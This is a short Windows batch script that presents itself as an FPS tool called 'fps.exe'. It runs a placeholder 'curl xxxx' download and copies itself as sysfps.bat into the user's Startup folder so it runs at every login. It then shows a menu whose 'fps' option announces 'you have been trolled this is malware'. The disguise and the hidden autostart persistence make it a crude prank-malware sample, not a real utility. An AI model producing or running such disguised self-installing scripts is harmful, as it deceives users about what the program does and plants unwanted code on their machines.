@echo off
title fps.exe
color 0a
cls 
curl xxxx
cls
copy sysfps.bat %userprofile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\sysfps.bat
:start
cls
echo fps
echo.
set /p main= choose
goto %main%



:fps
cls
echo you have been trolled this is malware
pause
exit